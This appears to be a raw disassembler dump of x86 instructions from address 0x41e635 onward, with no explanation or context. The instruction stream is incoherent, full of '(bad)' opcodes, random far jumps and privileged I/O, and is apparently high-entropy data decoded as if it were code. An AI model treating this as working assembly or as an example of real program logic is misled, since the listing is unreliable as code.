  41e635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e636:	les    eax,FWORD PTR [ebx+0x3411f2dc]
  41e63c:	and    ch,BYTE PTR ds:0xf2fd9e8e
  41e642:	jle    0x41e64d
  41e644:	aam    0xc6
  41e646:	mov    esp,0x680c35dd
  41e64b:	fistp  DWORD PTR [esi]
  41e64d:	cmp    al,BYTE PTR [esi-0x3ed19f86]
  41e653:	outs   dx,DWORD PTR ds:[esi]
  41e654:	sub    DWORD PTR [ebx],edi
  41e656:	cmp    esp,DWORD PTR [ecx+0x75]
  41e659:	inc    edi
  41e65a:	bound  edi,QWORD PTR [eax+0xc]
  41e65d:	jns    0x41e663
  41e65f:	daa    
  41e660:	pushf  
  41e661:	dec    esi
  41e662:	mov    ds:0x58ccf013,al
  41e667:	mov    esp,0xa389c987
  41e66c:	lahf   
  41e66d:	xchg   ebp,eax
  41e66e:	fisttp DWORD PTR [edx+ecx*4-0x7b]
  41e672:	dec    esp
  41e673:	push   ebp
  41e674:	fcom   QWORD PTR [eax+ebp*1-0x40611c2e]
  41e67b:	ins    DWORD PTR es:[edi],dx
  41e67c:	cmp    DWORD PTR [esi],edx
  41e67e:	and    ebx,DWORD PTR [eax+0x3f]
  41e681:	adc    dl,dl
  41e683:	dec    ebp
  41e684:	stos   DWORD PTR es:[edi],eax
  41e685:	cmc    
  41e686:	mov    WORD PTR [esi-0x1c380f07],cs
  41e68c:	loopne 0x41e6b9
  41e68e:	dec    ecx
  41e68f:	mov    dh,ah
  41e691:	push   es
  41e692:	add    BYTE PTR [esi+0x2329d1b5],al
  41e698:	gs out dx,al
  41e69a:	sub    BYTE PTR [ecx*2+0x60894cfa],bh
  41e6a1:	jmp    0x2ba84fa0
  41e6a6:	ja     0x41e664
  41e6a8:	pop    edx
  41e6a9:	xchg   esp,eax
  41e6aa:	dec    edi
  41e6ab:	adc    BYTE PTR [esi-0x6a5fec59],ah
  41e6b1:	add    eax,0x189c8a8f
  41e6b6:	out    dx,al
  41e6b7:	pop    edi
  41e6b8:	push   0xbce2a622
  41e6bd:	dec    edi
  41e6be:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41e6c0:	push   es
  41e6c1:	xchg   esp,eax
  41e6c2:	dec    ebx
  41e6c3:	cmp    ah,BYTE PTR [ebx+0x629ddb51]
  41e6c9:	sbb    al,ah
  41e6cb:	nop
  41e6cc:	add    eax,0x707711ca
  41e6d1:	add    al,0x36
  41e6d3:	add    eax,0xadac7679
  41e6d8:	xchg   esi,eax
  41e6d9:	lahf   
  41e6da:	nop
  41e6db:	lahf   
  41e6dc:	jg     0x41e690
  41e6de:	hlt    
  41e6df:	jnp    0x41e662
  41e6e1:	add    DWORD PTR [ecx+edi*8],esi
  41e6e4:	jle    0x41e6d6
  41e6e6:	in     eax,0x10
  41e6e8:	enter  0xc844,0x7d
  41e6ec:	sbb    al,0xbf
  41e6ee:	mov    esp,0x17404e54
  41e6f3:	ret    0xb63f
  41e6f6:	shr    DWORD PTR ds:0xb43348a7,0x22
  41e6fd:	jno    0x41e6f6
  41e6ff:	mov    ecx,0xc725b62f
  41e704:	pop    eax
  41e705:	div    BYTE PTR [edx+0x1c]
  41e708:	dec    ebx
  41e709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e70a:	stos   DWORD PTR es:[edi],eax
  41e70b:	out    0x9c,al
  41e70d:	jecxz  0x41e6fe
  41e70f:	mov    ecx,0x3555da18
  41e714:	stos   DWORD PTR es:[edi],eax
  41e715:	or     edx,DWORD PTR [eax+0x69]
  41e718:	sahf   
  41e719:	imul   edi,DWORD PTR [eax-0x2d116884],0xb2b60b66
  41e723:	retf   0x4457
  41e726:	ins    DWORD PTR es:[edi],dx
  41e727:	inc    edx
  41e728:	call   0xa4d67967
  41e72d:	mov    ecx,0xcc20da5
  41e732:	mov    bl,0x27
  41e734:	jmp    0xdaedb57a
  41e739:	pop    eax
  41e73a:	xchg   esp,eax
  41e73b:	mov    esi,DWORD PTR [edx+ecx*4]
  41e73e:	imul   ebp,DWORD PTR [esi-0x9e5ee25],0x4983d0
  41e748:	jmp    0x41e74e
  41e74a:	fsubr  DWORD PTR [eax+0x60]
  41e74d:	jecxz  0x41e6f3
  41e74f:	push   ebx
  41e750:	daa    
  41e751:	addr16 loope 0x41e7af
  41e754:	push   ss
  41e755:	out    dx,al
  41e756:	sbb    eax,esi
  41e758:	neg    DWORD PTR ds:[esi+0x3a0cd873]
  41e75f:	scas   al,BYTE PTR es:[edi]
  41e760:	cmp    DWORD PTR [edi+0x1c],edx
  41e763:	ins    BYTE PTR es:[edi],dx
  41e764:	je     0x41e756
  41e766:	test   BYTE PTR [ebp+0xb618a5e],bl
  41e76c:	sar    BYTE PTR [ecx],1
  41e76e:	pop    es
  41e76f:	push   edx
  41e770:	mov    ebp,0x143f9da8
  41e775:	pop    edi
  41e776:	xor    eax,0xe67f5652
  41e77b:	leave  
  41e77c:	int3   
  41e77d:	aas    
  41e77e:	mov    eax,ds:0x2b9bab5
  41e783:	mov    esi,0x9108eecd
  41e788:	in     al,dx
  41e789:	cld    
  41e78a:	jg     0x41e763
  41e78c:	ins    BYTE PTR es:[edi],dx
  41e78d:	cs test al,0x52
  41e790:	mov    ch,0x7e
  41e792:	jno    0x41e765
  41e794:	jecxz  0x41e71f
  41e796:	pop    es
  41e797:	fisub  DWORD PTR [eax+edx*2-0x3]
  41e79b:	sub    al,BYTE PTR [eax+edx*2-0x2a4ed938]
  41e7a2:	sub    DWORD PTR [edi-0x32],eax
  41e7a5:	add    al,BYTE PTR [ecx]
  41e7a7:	daa    
  41e7a8:	add    DWORD PTR [eax],ebx
  41e7aa:	ins    BYTE PTR es:[edi],dx
  41e7ab:	jns    0x41e74d
  41e7ad:	ins    DWORD PTR es:[edi],dx
  41e7ae:	test   eax,0x7ebd8d3c
  41e7b3:	ins    BYTE PTR es:[edi],dx
  41e7b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7b5:	mov    bh,0xf1
  41e7b7:	pop    edi
  41e7b8:	sbb    BYTE PTR [edi+0x23],0xed
  41e7bc:	lods   al,BYTE PTR ds:[esi]
  41e7bd:	test   DWORD PTR [ebp+0x725704cd],0xf9063f59
  41e7c7:	jecxz  0x41e7a8
  41e7c9:	fstp   DWORD PTR [ecx-0x12]
  41e7cc:	popf   
  41e7cd:	out    0x3d,eax
  41e7cf:	ins    DWORD PTR es:[edi],dx
  41e7d0:	outs   dx,BYTE PTR ds:[esi]
  41e7d1:	(bad)  
  41e7d2:	fwait
  41e7d3:	stos   DWORD PTR es:[edi],eax
  41e7d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7d5:	jmp    0x41e78c
  41e7d7:	xchg   esi,eax
  41e7d8:	xor    BYTE PTR [esi-0x4d251d39],0x7a
  41e7df:	add    ebx,DWORD PTR [esi]
  41e7e1:	sub    DWORD PTR [ecx+0x7bdc285b],edi
  41e7e7:	sbb    ebx,DWORD PTR [ebx-0x241989]
  41e7ed:	inc    ebp
  41e7ee:	add    DWORD PTR [ebp-0x6d],esp
  41e7f1:	ficomp DWORD PTR [esp+ecx*8+0x257b8883]
  41e7f8:	test   DWORD PTR [edi],ecx
  41e7fa:	aam    0x14
  41e7fc:	aas    
  41e7fd:	jae    0x41e864
  41e7ff:	fxch   st(5)
  41e801:	sti    
  41e802:	and    BYTE PTR [esi+0x1e],dh
  41e805:	fistp  WORD PTR [eax]
  41e807:	xor    BYTE PTR [eax+eax*2-0x32a878c3],cl
  41e80e:	push   eax
  41e80f:	loopne 0x41e855
  41e811:	cmp    DWORD PTR ds:0xb5edaffa,esp
  41e817:	mov    cl,0x48
  41e819:	cmc    
  41e81a:	mov    eax,ds:0xd55c8695
  41e81f:	pop    eax
  41e820:	mov    WORD PTR [edx],?
  41e822:	xor    BYTE PTR [ebx+edi*2-0x47],bh
  41e826:	xchg   BYTE PTR [ebp-0x2d7e4460],ah
  41e82c:	in     al,dx
  41e82d:	sub    dh,BYTE PTR [esi+0x39bdcdfc]
  41e833:	mov    edi,0xa97d51c
  41e838:	loope  0x41e825
  41e83a:	ficom  DWORD PTR [edi+0x39]
  41e83d:	(bad)  
  41e83f:	sub    ecx,edx
  41e841:	xor    cl,BYTE PTR [edi-0x3a8b455d]
  41e847:	sbb    edi,DWORD PTR [ecx]
  41e849:	(bad)  
  41e84a:	and    eax,0x2e26043a
  41e84f:	jbe    0x41e8c6
  41e851:	jmp    0x41e81a
  41e853:	pop    esp
  41e854:	cmp    BYTE PTR [esi],ch
  41e856:	push   esi
  41e857:	lds    esp,FWORD PTR [ecx]
  41e859:	jbe    0x41e7e7
  41e85b:	cli    
  41e85c:	outs   dx,DWORD PTR ds:[esi]
  41e85d:	dec    esp
  41e85e:	or     ecx,esi
  41e860:	push   0xf9ce51d7
  41e865:	or     BYTE PTR [ecx+0x36],al
  41e868:	scas   al,BYTE PTR es:[edi]
  41e869:	xchg   esp,eax
  41e86a:	aas    
  41e86b:	cmp    DWORD PTR [eax-0xd27a1ca],ebx
  41e871:	pop    ebp
  41e872:	jno    0x41e8cd
  41e874:	mov    edx,0x379fdf35
  41e879:	add    DWORD PTR [ecx],eax
  41e87b:	pop    eax
  41e87c:	int3   
  41e87d:	pushf  
  41e87e:	imul   ebx,DWORD PTR [ecx-0x4048c81c],0xffffffad
  41e885:	fstp   QWORD PTR [edi-0xd072c7a]
  41e88b:	pop    es
  41e88c:	mul    BYTE PTR [esi+ecx*1]
  41e88f:	enter  0x9ae4,0x49
  41e893:	add    BYTE PTR [ecx+0x65],bl
  41e896:	jecxz  0x41e83c
  41e898:	lock rcl DWORD PTR [ecx],cl
  41e89b:	cmp    al,0x81
  41e89d:	inc    ebx
  41e89e:	mov    BYTE PTR [ecx-0x51e61483],0x3d
  41e8a5:	xchg   BYTE PTR [esi-0xd],dl
  41e8a8:	fwait
  41e8a9:	(bad)  
  41e8aa:	jge    0x41e919
  41e8ac:	xchg   esp,eax
  41e8ad:	cli    
  41e8ae:	aam    0x26
  41e8b0:	rol    edi,0xc
  41e8b3:	repnz xchg ah,ch
  41e8b6:	jne    0x41e898
  41e8b8:	xor    DWORD PTR [ebx+0x7e],ebx
  41e8bb:	cmp    dl,al
  41e8bd:	shr    DWORD PTR ds:0x53e2c58f,1
  41e8c3:	inc    edi
  41e8c4:	hlt    
  41e8c5:	mov    ecx,0xff04c94c
  41e8ca:	xchg   ebp,eax
  41e8cb:	xchg   sp,ax
  41e8cd:	xor    DWORD PTR [ebp+0x35],esi
  41e8d0:	dec    ecx
  41e8d1:	(bad)  
  41e8d2:	xor    eax,0x2586755d
  41e8d7:	test   esp,esi
  41e8d9:	test   DWORD PTR [ebx+0x6a],0x551a1aaf
  41e8e0:	jb     0x41e876
  41e8e2:	sub    dl,BYTE PTR [edi+0x1aa0c39b]
  41e8e8:	pusha  
  41e8e9:	xor    DWORD PTR [eax-0x69],0xffffffd7
  41e8ed:	push   cs
  41e8ee:	adc    al,BYTE PTR [edi+eax*1+0x3f]
  41e8f2:	inc    ebp
  41e8f3:	sahf   
  41e8f4:	mov    ds:0x18c82227,eax
  41e8f9:	out    dx,al
  41e8fa:	movzx  ecx,WORD PTR [edi]
  41e8fd:	lea    ebp,[eax-0x2d]
  41e900:	test   DWORD PTR [ebx+0x28],esp
  41e903:	mov    WORD PTR [eax-0x50],ds
  41e906:	dec    edx
  41e907:	adc    ecx,ecx
  41e909:	pop    bx
  41e90b:	(bad)  [edi]
  41e90d:	mov    ecx,DWORD PTR [eax-0x163c0429]
  41e913:	shr    DWORD PTR [ecx],0xec
  41e916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e917:	xchg   ebx,eax
  41e918:	inc    edi
  41e919:	xchg   ecx,eax
  41e91a:	or     ch,ch
  41e91c:	outs   dx,BYTE PTR ds:[esi]
  41e91d:	aaa    
  41e91e:	es push 0x4
  41e921:	stos   BYTE PTR es:[edi],al
  41e922:	fdivr  DWORD PTR [eax-0x73f285e5]
  41e928:	rcl    BYTE PTR [edx-0x75],0xda
  41e92c:	dec    ecx
  41e92d:	jbe    0x41e995
  41e92f:	xchg   DWORD PTR [edi+0x75cc4405],ebp
  41e935:	je     0x41e94c
  41e937:	in     al,dx
  41e938:	mov    dl,0xcd
  41e93a:	dec    edi
  41e93b:	xchg   ecx,eax
  41e93c:	dec    ebx
  41e93d:	repnz (bad) 
  41e93f:	fisubr DWORD PTR [eax]
  41e941:	(bad)  
  41e942:	push   ds
  41e943:	and    edi,DWORD PTR [ecx-0x19231521]
  41e949:	add    edx,0x44876617
  41e94f:	push   edi
  41e950:	mov    ecx,0xced43f4a
  41e955:	fisttp DWORD PTR [eax]
  41e957:	shl    ebp,1
  41e959:	nop
  41e95a:	add    al,al
  41e95c:	repz cmp DWORD PTR [ebx-0x455eed6f],edx
  41e963:	cmc    
  41e964:	and    BYTE PTR [edx-0x5c],dh
  41e967:	test   BYTE PTR [edi-0x7c],bl
  41e96a:	mov    ch,0x60
  41e96c:	cmp    dl,ah
  41e96e:	call   0xe31b:0x760198cd
  41e975:	push   esp
  41e976:	push   edx
  41e977:	ret    
  41e978:	pop    ecx
  41e979:	or     cl,BYTE PTR [ecx+0x27]
  41e97c:	ret    0x24a7
  41e97f:	xchg   edi,eax
  41e980:	clc    
  41e981:	rcr    BYTE PTR [esi],cl
  41e983:	pop    esi
  41e984:	dec    esi
  41e985:	dec    esp
  41e986:	xor    eax,0xd6add740
  41e98b:	add    ebx,DWORD PTR [edx+0x2ef748e4]
  41e991:	aas    
  41e992:	dec    ebp
  41e993:	stc    
  41e994:	test   DWORD PTR [esi-0x58],ebx
  41e997:	xchg   edi,eax
  41e998:	mov    al,ds:0xe1995874
  41e99d:	mov    edx,0xfc400b3b
  41e9a2:	dec    esp
  41e9a3:	add    bl,dh
  41e9a5:	(bad)  
  41e9a6:	sub    eax,0xe8baddc1
  41e9ab:	dec    esp
  41e9ac:	(bad)  
  41e9ad:	stos   BYTE PTR es:[edi],al
  41e9ae:	sub    ecx,ecx
  41e9b0:	fcomp  QWORD PTR [ecx-0x461a0888]
  41e9b6:	push   ds
  41e9b7:	fs push ecx
  41e9b9:	pushf  
  41e9ba:	dec    ecx
  41e9bb:	push   es
  41e9bc:	outs   dx,DWORD PTR ds:[esi]
  41e9bd:	fcomp  QWORD PTR [edi]
  41e9bf:	cmp    eax,0xe961be49
  41e9c4:	and    al,0x28
  41e9c6:	ja     0x41e989
  41e9c8:	mov    ecx,0x3a535836
  41e9cd:	mov    edi,0x3ac92a8e
  41e9d2:	ret    0x98e4
  41e9d5:	mov    ebp,0x187ae8e2
  41e9da:	jo     0x41e9f0
  41e9dc:	adc    ebp,DWORD PTR [ecx+edi*1+0x4ecf158b]
  41e9e3:	jo     0x41e9e9
  41e9e5:	clc    
  41e9e6:	sbb    eax,0x6eb7bf0a
  41e9eb:	shl    DWORD PTR [ebp-0x754ee9d4],1
  41e9f1:	test   eax,0xf02e5f1b
  41e9f6:	jnp    0x41ea60
  41e9f8:	xor    dh,BYTE PTR [ebx]
  41e9fa:	not    DWORD PTR [eax+ebp*8]
  41e9fd:	sbb    edx,DWORD PTR [ebp-0x4c]
  41ea00:	xchg   esi,eax
  41ea01:	push   ebx
  41ea02:	aaa    
  41ea03:	popa   
  41ea04:	cs into 
  41ea06:	xchg   esp,eax
  41ea07:	arpl   WORD PTR ds:0xd73cfccf,bp
  41ea0d:	xor    esi,DWORD PTR [edi+0x49b93105]
  41ea13:	push   ss
  41ea14:	lock and BYTE PTR [esi+eiz*4-0x6b],al
  41ea19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea1a:	fadd   QWORD PTR ss:[edi-0x11]
  41ea1e:	icebp  
  41ea1f:	loope  0x41ea10
  41ea21:	push   edi
  41ea22:	fmul   QWORD PTR [edi+ecx*2+0x38]
  41ea26:	xchg   ecx,eax
  41ea27:	bswap  ebx
  41ea29:	shl    BYTE PTR [ecx],1
  41ea2b:	clc    
  41ea2c:	jne    0x41ea4b
  41ea2e:	hlt    
  41ea2f:	and    edi,esp
  41ea31:	and    BYTE PTR [ebx-0x5521e1],bh
  41ea37:	lds    ebp,FWORD PTR [ebp-0x32]
  41ea3a:	(bad)  
  41ea3b:	cwde   
  41ea3c:	loopne 0x41e9ee
  41ea3e:	cmp    edi,DWORD PTR [esi-0x46cca168]
  41ea44:	xchg   ecx,eax
  41ea45:	test   DWORD PTR [edx],edx
  41ea47:	jl     0x41eac2
  41ea49:	ffreep st(2)
  41ea4b:	clc    
  41ea4c:	aam    0x2b
  41ea4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea4f:	aaa    
  41ea50:	adc    DWORD PTR [esi],edi
  41ea52:	sbb    eax,0x5df7ce0f
  41ea57:	daa    
  41ea58:	inc    edx
  41ea59:	cwde   
  41ea5a:	mov    cl,0xb4
  41ea5c:	aad    0x73
  41ea5e:	mov    ebx,0x96859cfb
  41ea63:	int3   
  41ea64:	add    al,0x72
  41ea66:	push   0xffffffe2
  41ea68:	jbe    0x41ea9c
  41ea6a:	dec    ebx
  41ea6b:	jnp    0x41ea48
  41ea6d:	repnz mov esi,0x29e41051
  41ea73:	enter  0x1928,0xfa
  41ea77:	pop    ebp
  41ea78:	int3   
  41ea79:	inc    eax
  41ea7a:	or     esp,DWORD PTR [eax+0x29]
  41ea7d:	mov    esp,0xdf487f66
  41ea82:	push   ds
  41ea83:	mov    edx,0x2ea5efe3
  41ea88:	ja     0x41eabf
  41ea8a:	imul   ecx,edx,0x5a54c258
  41ea90:	add    al,0x20
  41ea92:	ds cmp al,0xc
  41ea95:	mov    eax,0x9ab9117b
  41ea9a:	mov    bh,0x1d
  41ea9d:	fdivr  DWORD PTR [ecx*8+0x5da51638]
  41eaa4:	mov    esi,0xc4ef6350
  41eaa9:	imul   ebp,edx,0x2a
  41eaac:	repnz or dl,0x97
  41eab0:	ds mov esp,0xb5ca1756
  41eab6:	mov    esp,0x61e0fe16
  41eabb:	inc    ecx
  41eabc:	fwait
  41eabd:	jmp    0x4ee2065e
  41eac2:	and    eax,0xc35f8135
  41eac7:	mov    dh,ah
  41eac9:	ret    0x28d2
  41eacc:	stos   DWORD PTR es:[edi],eax
  41eacd:	ret    0xed4e
  41ead0:	rol    DWORD PTR [eax],0xce
  41ead3:	jo     0x41ea73
  41ead5:	lea    esi,[edx-0x367ddd59]
  41eadb:	fidivr WORD PTR [ebp-0x7d]
  41eade:	test   al,0xaa
  41eae0:	dec    ebx
  41eae1:	mov    dl,dh
  41eae3:	xchg   edi,eax
  41eae4:	jg     0x41eab9
  41eae6:	cwd    
  41eae8:	pop    ebp
  41eae9:	das    
  41eaea:	or     al,BYTE PTR ds:0x2e75f105
  41eaf0:	or     al,0xb6
  41eaf2:	inc    esp
  41eaf3:	in     eax,dx
  41eaf4:	mov    ah,0x23
  41eaf6:	push   ss
  41eaf7:	sar    BYTE PTR [ebx+0xf4f05e4],cl
  41eafd:	jae    0x41eb0f
  41eaff:	sbb    ch,BYTE PTR [ecx-0x23]
  41eb02:	ret    
  41eb03:	(bad)  
  41eb04:	(bad)  
  41eb05:	xchg   ebp,eax
  41eb06:	pop    ecx
  41eb07:	ins    BYTE PTR es:[edi],dx
  41eb08:	std    
  41eb09:	mov    ch,0xb8
  41eb0b:	add    al,0x39
  41eb0d:	pushf  
  41eb0e:	pushf  
  41eb0f:	out    0xf5,al
  41eb11:	leave  
  41eb12:	or     esp,DWORD PTR [ecx+0x15]
  41eb15:	sbb    bh,0x24
  41eb18:	ins    DWORD PTR es:[edi],dx
  41eb19:	or     edi,DWORD PTR [ebx-0x6f2d0f37]
  41eb1f:	mov    BYTE PTR [ebp+edx*4-0x14e0417b],dh
  41eb26:	cld    
  41eb27:	mov    al,0xaf
  41eb29:	sub    BYTE PTR [eax],ch
  41eb2b:	xor    cl,BYTE PTR [ecx+0x75]
  41eb2e:	ss js  0x41eb03
  41eb31:	inc    ecx
  41eb32:	ds pop es
  41eb34:	ins    BYTE PTR es:[edi],dx
  41eb35:	dec    ebx
  41eb36:	cs inc ebp
  41eb38:	imul   DWORD PTR [esi+ecx*8+0x302b5981]
  41eb3f:	or     bl,dh
  41eb41:	jne    0x41ead3
  41eb43:	shr    DWORD PTR [eax+0x9],1
  41eb46:	jg     0x41eb1a
  41eb48:	call   0xfd57:0x3b6d5582
  41eb4f:	adc    al,0xe
  41eb51:	retf   
  41eb52:	xor    cl,ah
  41eb54:	adc    BYTE PTR [ecx],ch
  41eb56:	loopne 0x41eb88
  41eb58:	mov    esi,0xe30fc448
  41eb5d:	cmp    dl,BYTE PTR [ebx+0x7d2b62e6]
  41eb63:	or     eax,0x777d216
  41eb68:	(bad)  
  41eb69:	pop    eax
  41eb6a:	mov    dh,0x45
  41eb6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb6d:	ret    
  41eb6e:	stos   DWORD PTR es:[edi],eax
  41eb6f:	(bad)  
  41eb70:	pop    esp
  41eb71:	jae    0x41eb30
  41eb73:	jnp    0x41eb6c
  41eb75:	cmp    bl,BYTE PTR [ebp+0x35d618f]
  41eb7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb7c:	and    DWORD PTR [ebp+0x67],0xffffffdc
  41eb80:	push   0x231f4cb3
  41eb85:	test   al,0x70
  41eb87:	push   ebp
  41eb88:	fcmovu st,st(0)
  41eb8a:	pusha  
  41eb8b:	push   ecx
  41eb8c:	mov    al,0x89
  41eb8e:	or     BYTE PTR [esi-0x11],bl
  41eb91:	xchg   ecx,eax
  41eb92:	xchg   ebp,eax
  41eb93:	in     al,0x20
  41eb95:	sbb    ebp,DWORD PTR [ebx-0x2f]
  41eb98:	add    edi,ecx
  41eb9a:	test   eax,0x19908027
  41eb9f:	addr16 jp 0x41ebad
  41eba2:	loop   0x41ebee
  41eba4:	pop    ebx
  41eba5:	fdivr  QWORD PTR [edi-0x4d4f78b]
  41ebab:	mov    bl,0x21
  41ebad:	addr16 cmp al,0xe2
  41ebb0:	in     al,0xb1
  41ebb2:	sub    bh,ch
  41ebb4:	or     al,0xea
  41ebb6:	dec    bh
  41ebb8:	xchg   esp,eax
  41ebb9:	fadd   QWORD PTR [esi-0x51]
  41ebbc:	ja     0x41eb92
  41ebbe:	(bad)  
  41ebbf:	jmp    0x41eb7a
  41ebc1:	aad    0x18
  41ebc3:	xchg   ebp,eax
  41ebc4:	loopne 0x41ec3e
  41ebc6:	jle    0x41ebfd
  41ebc8:	cli    
  41ebc9:	push   ds
  41ebca:	and    al,0xc8
  41ebcc:	lods   al,BYTE PTR ds:[esi]
  41ebcd:	dec    edx
  41ebce:	ins    BYTE PTR es:[edi],dx
  41ebcf:	xchg   DWORD PTR [ebx+0x19],eax
  41ebd2:	std    
  41ebd3:	xlat   BYTE PTR ds:[ebx]
  41ebd4:	adc    eax,0x42aade77
  41ebd9:	adc    bh,BYTE PTR [ebp+0x648fc2b1]
  41ebdf:	and    ah,BYTE PTR [edi+0x8]
  41ebe2:	sti    
  41ebe3:	aas    
  41ebe4:	mov    ah,0x11
  41ebe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebe7:	loop   0x41ec68
  41ebe9:	addr16 loopne 0x41eba7
  41ebec:	push   esp
  41ebed:	in     eax,dx
  41ebee:	sar    BYTE PTR [ecx+0x20f37752],0x49
  41ebf5:	mov    eax,ds:0xb3490c9a
  41ebfa:	push   edx
  41ebfb:	rcr    BYTE PTR [edx+0x162dbde1],cl
  41ec01:	or     al,0xbd
  41ec03:	push   edx
  41ec04:	rcr    DWORD PTR [esi-0x47],1
  41ec07:	stos   DWORD PTR es:[edi],eax
  41ec08:	adc    DWORD PTR [ebp+0xbc76587],edx
  41ec0e:	mov    esp,0x950c3e3c
  41ec13:	mov    esi,0xdc7b977
  41ec18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec19:	call   0xf0a2674f
  41ec1e:	fucomi st,st(0)
  41ec20:	fadd   QWORD PTR [ebp-0x14]
  41ec23:	repnz mov BYTE PTR [esi+0x21],cl
  41ec27:	addr16 jmp 0x41ec1f
  41ec2a:	sbb    ecx,DWORD PTR [eax+0x1492a523]
  41ec30:	cwde   
  41ec31:	pop    edi
  41ec32:	pop    ds
  41ec33:	and    ch,bh
  41ec35:	sbb    DWORD PTR [ebp+0x10],esi
  41ec38:	add    ebx,edi
  41ec3a:	ins    BYTE PTR es:[edi],dx
  41ec3b:	adc    DWORD PTR [ecx],0x2e
  41ec3e:	jl     0x41ec42
  41ec40:	and    al,0x6e
  41ec42:	dec    eax
  41ec43:	scas   eax,DWORD PTR es:[edi]
  41ec44:	xchg   edx,eax
  41ec45:	inc    edx
  41ec46:	sbb    cl,BYTE PTR [edi+0x67]
  41ec49:	cmp    edi,DWORD PTR [ecx-0x61]
  41ec4c:	es out dx,eax
  41ec4e:	mov    BYTE PTR es:[eax],ah
  41ec51:	stc    
  41ec52:	and    al,0x33
  41ec54:	mov    bl,BYTE PTR [edi-0x3e]
  41ec57:	out    dx,al
  41ec58:	jnp    0x41ec7d
  41ec5a:	rep outs dx,DWORD PTR ds:[esi]
  41ec5c:	or     al,0xd4
  41ec5e:	sbb    DWORD PTR [edi-0x3c],ecx
  41ec61:	push   esp
  41ec62:	jp     0x41ec7f
  41ec64:	add    esp,DWORD PTR [ebx+0x74]
  41ec67:	mov    edx,0x7dabe2ee
  41ec6c:	std    
  41ec6d:	jbe    0x41ec5c
  41ec6f:	jmp    0x41ec95
  41ec71:	sbb    al,dl
  41ec73:	or     al,0xef
  41ec75:	(bad)  
  41ec76:	lahf   
  41ec77:	mov    ch,BYTE PTR [ecx+0x55]
  41ec7a:	imul   eax,DWORD PTR [edi+0x5b3b9aa9],0x44
  41ec81:	and    esp,0x7a
  41ec84:	out    dx,al
  41ec85:	fdivr  DWORD PTR [esi+0xaa0176a]
  41ec8b:	sar    DWORD PTR [ebx+ecx*8],cl
  41ec8e:	lea    ebx,[edx]
  41ec90:	add    al,0x37
  41ec92:	or     al,0xc5
  41ec94:	fnstsw WORD PTR [ebx]
  41ec96:	jmp    0x8131870e
  41ec9b:	jmp    0x240c5f50
  41eca0:	repz cmp DWORD PTR [edx+ebp*1+0x362782a0],esp
  41eca8:	sbb    DWORD PTR [esi*4+0xfdc935a],esp
  41ecaf:	ss popf 
  41ecb1:	stc    
  41ecb2:	jp     0x41ec9e
  41ecb4:	push   ss
  41ecb5:	out    0x58,al
  41ecb7:	cmc    
  41ecb8:	(bad)  
  41ecb9:	mov    esp,fs
  41ecbb:	js     0x41ecae
  41ecbd:	push   edx
  41ecbe:	out    dx,al
  41ecbf:	pop    esp
  41ecc0:	or     DWORD PTR [eax+0x20],esp
  41ecc3:	mov    bl,0x9f
  41ecc5:	hlt    
  41ecc6:	retf   0x78df
  41ecc9:	aaa    
  41ecca:	ins    DWORD PTR es:[edi],dx
  41eccb:	and    ebx,ebx
  41eccd:	(bad)  
  41ecce:	frstpm(287 only) 
  41ecd0:	jge    0x41ecea
  41ecd2:	or     al,0x48
  41ecd4:	mov    ch,0xb2
  41ecd7:	xchg   esp,eax
  41ecd8:	pusha  
  41ecd9:	sub    edx,DWORD PTR [eax-0x5b7b7c56]
  41ecdf:	mov    edi,0x995a238d
  41ece4:	in     eax,dx
  41ece5:	fwait
  41ece6:	in     eax,dx
  41ece7:	add    eax,0x679fba02
  41ecec:	jecxz  0x41eccb
  41ecee:	mov    ebx,0x89a1eb7a
  41ecf3:	clc    
  41ecf4:	syscall 
  41ecf6:	call   0x8fcb:0xd956ff1b
  41ecfd:	push   ss
  41ecfe:	cmp    dh,BYTE PTR [ebx-0x6b]
  41ed01:	outs   dx,BYTE PTR ds:[esi]
  41ed02:	xchg   ecx,eax
  41ed03:	push   0x6da523f
  41ed08:	gs mov ebx,0xdc7c4da1
  41ed0e:	aaa    
  41ed0f:	mov    bl,0x6
  41ed11:	xor    eax,0xa6f6a385
  41ed16:	aas    
  41ed17:	das    
  41ed18:	jae    0x41ed6f
  41ed1a:	cs das 
  41ed1c:	sbb    dl,BYTE PTR [ecx+edx*8]
  41ed1f:	or     al,0x3a
  41ed21:	ss in  al,dx
  41ed23:	ror    BYTE PTR [esi+ebp*4],1
  41ed26:	or     eax,DWORD PTR [edi+ebp*2+0xee3f41f]
  41ed2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed2e:	ss ins BYTE PTR es:[edi],dx
  41ed30:	int3   
  41ed31:	lock push esp
  41ed33:	test   eax,0x9c89c695
  41ed38:	dec    edi
  41ed39:	shl    DWORD PTR [edx],0xde
  41ed3c:	sbb    ebp,esi
  41ed3e:	mov    dl,0x3b
  41ed40:	stos   DWORD PTR es:[edi],eax
  41ed41:	aad    0x73
  41ed43:	out    0xa9,eax
  41ed45:	and    edi,DWORD PTR [ebp+0x37]
  41ed48:	sub    dl,bh
  41ed4a:	jmp    0x41ed20
  41ed4c:	xor    eax,DWORD PTR [esi]
  41ed4e:	add    dl,ah
  41ed50:	pop    ebp
  41ed51:	retf   0x30d0
  41ed54:	dec    esi
  41ed55:	dec    DWORD PTR [edi+0x26]
  41ed58:	fcmovnu st,st(0)
  41ed5a:	xor    al,0x89
  41ed5c:	test   eax,0x44aa8113
  41ed61:	mov    cl,0x66
  41ed63:	adc    ecx,ebx
  41ed65:	dec    ebx
  41ed66:	outs   dx,BYTE PTR ds:[esi]
  41ed67:	scas   al,BYTE PTR es:[edi]
  41ed68:	ror    DWORD PTR [esi],0x20
  41ed6b:	imul   edx,DWORD PTR [ecx-0x16b9dc5b],0x4a
  41ed72:	adc    cl,cl
  41ed74:	sahf   
